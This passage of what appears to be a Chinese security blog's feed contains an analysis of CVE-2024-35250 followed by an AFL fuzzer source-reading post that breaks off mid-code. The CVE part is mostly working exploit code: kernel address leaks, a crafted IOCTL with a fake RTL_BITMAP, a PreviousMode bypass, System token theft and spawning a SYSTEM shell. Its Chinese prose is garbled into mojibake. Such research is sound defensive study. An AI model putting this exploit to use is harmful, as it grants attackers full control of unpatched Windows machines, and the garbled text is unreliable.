class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¡ä»¶ç¼–è¯‘é€‰æ‹©åˆ©ç”¨æ–¹å¼</span></span><br><span class="line"><span class="comment">//#define _SEP_TOKEN_PRIVILEGES0xc1b4  // TOKENæƒé™ä¿®æ”¹æ–¹å¼</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PREVIOUS_MODE0xbaba    <span class="comment">// PreviousModeç»•è¿‡æ–¹å¼</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// å¿…è¦çš„åº“ä¾èµ–</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ksproxy.lib&quot;</span>)    <span class="comment">// KSä»£ç†åº“</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ksuser.lib&quot;</span>)     <span class="comment">// KSç”¨æˆ·æ¨¡å¼åº“  </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdllp.lib&quot;</span>)     <span class="comment">// NTå†…æ ¸åº“</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;SetupAPI.lib&quot;</span>)   <span class="comment">// è®¾å¤‡æšä¸¾API</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)   <span class="comment">// é«˜çº§API</span></span></span><br></pre></td></tr></table></figure><h4 id="è®¾å¤‡è·å–å’Œåœ°å€æ³„éœ²"><a href="#è®¾å¤‡è·å–å’Œåœ°å€æ³„éœ²" class="headerlink" title="è®¾å¤‡è·å–å’Œåœ°å€æ³„éœ²"></a>è®¾å¤‡è·å–å’Œåœ°å€æ³„éœ²</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. è·å–DRMè®¾å¤‡å¥æŸ„</span></span><br><span class="line">hDevice = <span class="built_in">GetKsDevice</span>(KSCATEGORY_DRM_DESCRAMBLE);</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°é€šè¿‡<code>KSCATEGORY_DRM_DESCRAMBLE</code> GUIDè·å–DRMè§£æ‰°è®¾å¤‡çš„å¥æŸ„ã€‚è¿™æ˜¯åˆ©ç”¨Kernel Streamingæ¼æ´çš„å…¥å£ç‚¹ã€‚</p><p><strong>åœ°å€æ³„éœ²é˜¶æ®µ(ä»…_PREVIOUS_MODEæ¨¡å¼)ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. æ³„éœ²Systemè¿›ç¨‹EPROCESSåœ°å€</span></span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);  <span class="comment">// PID 4æ˜¯Systemè¿›ç¨‹</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. æ³„éœ²å½“å‰çº¿ç¨‹KTHREADåœ°å€  </span></span><br><span class="line">hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curthread, <span class="built_in">GetCurrentProcessId</span>(), hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. æ³„éœ²å½“å‰è¿›ç¨‹EPROCESSåœ°å€</span></span><br><span class="line">hCurproc = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, TRUE, <span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line">Ret = <span class="built_in">GetObjPtr</span>(&amp;Curproc, <span class="built_in">GetCurrentProcessId</span>(), hCurproc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br></pre></td></tr></table></figure><h4 id="æ„é€ æ¶æ„IOCTLè¯·æ±‚"><a href="#æ„é€ æ¶æ„IOCTLè¯·æ±‚" class="headerlink" title="æ„é€ æ¶æ„IOCTLè¯·æ±‚"></a>æ„é€ æ¶æ„IOCTLè¯·æ±‚</h4><p><strong>è¾“å…¥ç¼“å†²åŒºåˆå§‹åŒ–ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pInBufProperty-&gt;Set = KSPROPSETID_DrmAudioStream;    <span class="comment">// å±æ€§é›†GUID</span></span><br><span class="line">pInBufProperty-&gt;Flags = KSPROPERTY_TYPE_UNSERIALIZESET;  <span class="comment">// å…³é”®ï¼šè§¦å‘UnserializePropertySet</span></span><br><span class="line">pInBufProperty-&gt;Id = <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç¼“å†²åŒºåˆå§‹åŒ–ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pSerialHdr-&gt;PropertySet = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerialHdr-&gt;Count = <span class="number">0x1</span>;  <span class="comment">// å±æ€§æ•°é‡</span></span><br><span class="line"></span><br><span class="line">pSerial-&gt;PropertyLength = <span class="built_in">sizeof</span>(EXPLOIT_DATA1);</span><br><span class="line">pSerial-&gt;Id = <span class="number">0x0</span>;</span><br><span class="line">pSerial-&gt;PropTypeSet.Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerial-&gt;PropTypeSet.Flags = <span class="number">0x0</span>;</span><br><span class="line">pSerial-&gt;PropTypeSet.Id = <span class="number">0x45</span>;</span><br></pre></td></tr></table></figure><h4 id="æ„é€ ä¼ªé€ çš„RTL-BITMAPç»“æ„"><a href="#æ„é€ ä¼ªé€ çš„RTL-BITMAPç»“æ„" class="headerlink" title="æ„é€ ä¼ªé€ çš„RTL_BITMAPç»“æ„"></a>æ„é€ ä¼ªé€ çš„RTL_BITMAPç»“æ„</h4><p><strong>è·å–ntoskrnl.exeåŸºå€ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UINT_PTR ntoskrnlBase = <span class="built_in">GetKernelModuleAddress</span>(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] ntoskrnl.exe base address = %llx\n&quot;</span>, ntoskrnlBase);</span><br></pre></td></tr></table></figure><p><strong>æ ¹æ®åˆ©ç”¨æ¨¡å¼æ„é€ ä¸åŒçš„FakeBitmapï¼š</strong></p><p><strong>æ¨¡å¼1 - TOKENæƒé™ä¿®æ”¹ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span> * <span class="number">4</span>;  <span class="comment">// è¦†ç›–32å­—èŠ‚</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlSetAllBits&quot;</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>æ¨¡å¼2 - PreviousModeç»•è¿‡ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span>;  <span class="comment">// è¦†ç›–32å­—èŠ‚</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = <span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = <span class="built_in">Ptr64</span>(<span class="built_in">leak_gadget_address</span>(<span class="string">&quot;RtlClearAllBits&quot;</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h4 id="è§¦å‘æ¼æ´"><a href="#è§¦å‘æ¼æ´" class="headerlink" title="è§¦å‘æ¼æ´"></a>è§¦å‘æ¼æ´</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="built_in">SendIoctlReq</span>(hDevice);</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°å‘é€æ„é€ çš„IOCTLè¯·æ±‚åˆ°KSè®¾å¤‡ï¼Œè§¦å‘<code>ks!UnserializePropertySet</code>ä¸­çš„æ¼æ´ä»£ç è·¯å¾„</p><h4 id="ææƒåˆ©ç”¨"><a href="#ææƒåˆ©ç”¨" class="headerlink" title="ææƒåˆ©ç”¨"></a>ææƒåˆ©ç”¨</h4><p><strong>æ¨¡å¼1 - TOKENæƒé™ææƒï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"><span class="comment">// æ‰“å¼€winlogon.exeè¿›ç¨‹(æ‹¥æœ‰SYSTEMæƒé™)</span></span><br><span class="line">HANDLE hWinLogon = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetPidByName</span>(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"><span class="comment">// ä»é«˜æƒé™è¿›ç¨‹åˆ›å»ºæ–°è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">CreateProcessFromHandle</span>(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>æ¨¡å¼2 - DKOM(Direct Kernel Object Manipulation)ææƒï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="comment">// å¤åˆ¶Systemè¿›ç¨‹çš„Tokenåˆ°å½“å‰è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), </span><br><span class="line">        <span class="built_in">Ptr64</span>(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), </span><br><span class="line">        TOKEN_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¢å¤PreviousModeä»¥é¿å…BSOD</span></span><br><span class="line">KPROCESSOR_MODE mode = UserMode;</span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621), &amp;mode, <span class="built_in">sizeof</span>(mode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯åŠ¨SYSTEMæƒé™çš„cmd.exe</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2024-35250åˆ†æ&quot;&gt;&lt;a href=&quot;#CVE-2024-35250åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;CVE-2024-35250åˆ†æ&quot;&gt;&lt;/a&gt;CVE-2024-35250åˆ†æ&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="Windowså†…æ ¸æ¼æ´" scheme="http://s1nec-1o.github.io/categories/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Windows kernel" scheme="http://s1nec-1o.github.io/tags/Windows-kernel/"/>
    
  </entry>
  
  <entry>
    <title>AFLæºç é˜…è¯»ä¹‹afl-fuzzç»“æŸ</title>
    <link href="http://s1nec-1o.github.io/2025/08/16/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz%E7%BB%93%E6%9D%9F/"/>
    <id>http://s1nec-1o.github.io/2025/08/16/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz%E7%BB%93%E6%9D%9F/</id>
    <published>2025-08-16T07:03:01.000Z</published>
    <updated>2025-08-16T07:05:50.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFL-fuzzæºç é˜…è¯»"><a href="#AFL-fuzzæºç é˜…è¯»" class="headerlink" title="AFL-fuzzæºç é˜…è¯»"></a>AFL-fuzzæºç é˜…è¯»</h1><h2 id="perform-dry-run-use-argv"><a href="#perform-dry-run-use-argv" class="headerlink" title="perform_dry_run(use_argv);"></a>perform_dry_run(use_argv);</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">perform_dry_run</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q = queue;</span><br><span class="line">  u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">  u8* skip_crashes = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line"></span><br><span class="line">    u8* use_mem;</span><br><span class="line">    u8  res;</span><br><span class="line">    s32 fd;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(q-&gt;fname, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    use_mem = <span class="built_in">ck_alloc_nozero</span>(q-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">calibrate_case</span>(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">ck_free</span>(use_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      <span class="built_in">SAYF</span>(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST, </span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"> ..... </span><br><span class="line">  &#125;</span><br><span class="line">.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä»queueè·å–æµ‹è¯•æ ·ä¾‹<code>(fn == &quot;id:000000,orig:case&quot;)</code>ï¼Œç„¶åè¯»å–ä¹‹åè°ƒç”¨<code>calibrate_case</code>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  fault = <span class="number">0</span>, new_bits = <span class="number">0</span>, var_detected = <span class="number">0</span>, hnb = <span class="number">0</span>,</span><br><span class="line">      first_run = (q-&gt;exec_cksum == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc = stage_cur, old_sm = stage_max;</span><br><span class="line">  u32 use_tmout = exec_tmout;</span><br><span class="line">  u8* old_sn = stage_name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span></span><br><span class="line"><span class="comment">     trying to calibrate already-added finds. This helps avoid trouble due</span></span><br><span class="line"><span class="comment">     to intermittent latency. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout = <span class="built_in">MAX</span>(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC / <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;calibration&quot;</span>;</span><br><span class="line">  stage_max  = fast_cal ? <span class="number">3</span> : CAL_CYCLES;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span></span><br><span class="line"><span class="comment">     count its spin-up time toward binary calibration. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    <span class="built_in">init_forkserver</span>(argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">    hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">    <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  start_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">write_to_testcase</span>(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">    fault = <span class="built_in">run_target</span>(argv, use_tmout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span></span><br><span class="line"><span class="comment">       we want to bail out quickly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || fault != crash_mode) <span class="keyword">goto</span> abort_calibration;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !<span class="built_in">count_bytes</span>(trace_bits)) &#123;</span><br><span class="line">      fault = FAULT_NOINST;</span><br><span class="line">      <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;</span><br><span class="line"></span><br><span class="line">      hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">      <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        u32 i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">            var_bytes[i] = <span class="number">1</span>;</span><br><span class="line">            stage_max    = CAL_CYCLES_LONG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var_detected = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        q-&gt;exec_cksum = cksum;</span><br><span class="line">        <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line">  total_cal_us     += stop_us - start_us;</span><br><span class="line">  total_cal_cycles += stage_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* OK, let&#x27;s collect some stats about the performance of this test case.</span></span><br><span class="line"><span class="comment">     This is used for fuzzing air time calculations in calculate_score(). */</span></span><br><span class="line"></span><br><span class="line">  q-&gt;exec_us     = (stop_us - start_us) / stage_max;</span><br><span class="line">  q-&gt;bitmap_size = <span class="built_in">count_bytes</span>(trace_bits);</span><br><span class="line">  q-&gt;handicap    = handicap;</span><br><span class="line">  q-&gt;cal_failed  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">update_bitmap_score</span>(q);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If this case didn&#x27;t result in new output from the instrumentation, tell</span></span><br><span class="line"><span class="comment">     parent. This is a non-critical problem, but something to warn the user</span></span><br><span class="line"><span class="comment">     about. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault = FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">    queued_with_cov++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark variable paths. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (var_detected) &#123;</span><br><span class="line"></span><br><span class="line">    var_byte_count = <span 